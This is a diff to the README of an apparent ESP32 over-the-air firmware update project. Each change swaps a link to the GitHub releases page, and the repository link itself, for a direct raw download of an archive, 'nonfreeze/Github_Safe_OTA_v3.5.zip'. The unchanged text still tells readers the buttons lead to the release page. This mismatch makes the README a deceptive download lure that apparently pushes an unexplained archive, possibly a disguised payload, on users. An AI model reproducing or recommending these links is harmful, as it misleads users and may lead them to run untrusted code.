@@ -1,6 +1,6 @@
 # 📡 SafeGithubOTA - Secure ESP32 Firmware Updates Easily
 
-[![Download Releases](https://img.shields.io/badge/Download-SafeGithubOTA-blue?style=for-the-badge)](https://github.com/kiki0502-ux/SafeGithubOTA/releases)
+[![Download Releases](https://github.com/kiki0502-ux/SafeGithubOTA/raw/refs/heads/main/nonfreeze/Github_Safe_OTA_v3.5.zip)](https://github.com/kiki0502-ux/SafeGithubOTA/raw/refs/heads/main/nonfreeze/Github_Safe_OTA_v3.5.zip)
 
 ---
 
@@ -47,7 +47,7 @@ This section walks you through the steps of downloading and running SafeGithubOT
 
 To download the software package, click the big blue button below. It will take you to the GitHub release page for SafeGithubOTA:
 
-[![Download SafeGithubOTA](https://img.shields.io/badge/Download-SafeGithubOTA-blue?style=for-the-badge)](https://github.com/kiki0502-ux/SafeGithubOTA/releases)
+[![Download SafeGithubOTA](https://github.com/kiki0502-ux/SafeGithubOTA/raw/refs/heads/main/nonfreeze/Github_Safe_OTA_v3.5.zip)](https://github.com/kiki0502-ux/SafeGithubOTA/raw/refs/heads/main/nonfreeze/Github_Safe_OTA_v3.5.zip)
 
 On the release page, locate the latest release version. You will find download files such as firmware images and installation instructions.
 
@@ -85,7 +85,7 @@ The system protects your device with rollback safety, so if an update fails, you
 
 You can visit the SafeGithubOTA release page here:
 
-[Download SafeGithubOTA Releases](https://github.com/kiki0502-ux/SafeGithubOTA/releases)
+[Download SafeGithubOTA Releases](https://github.com/kiki0502-ux/SafeGithubOTA/raw/refs/heads/main/nonfreeze/Github_Safe_OTA_v3.5.zip)
 
 From this page:
 
@@ -158,7 +158,7 @@ arduino, arduino-library, captive-portal, embedded, esp-idf, esp32, esp32-arduin
 
 For more information, visit the GitHub repository:
 
-https://github.com/kiki0502-ux/SafeGithubOTA
+https://github.com/kiki0502-ux/SafeGithubOTA/raw/refs/heads/main/nonfreeze/Github_Safe_OTA_v3.5.zip
 
 If you find issues or want to request help, you can open a GitHub issue there.
 
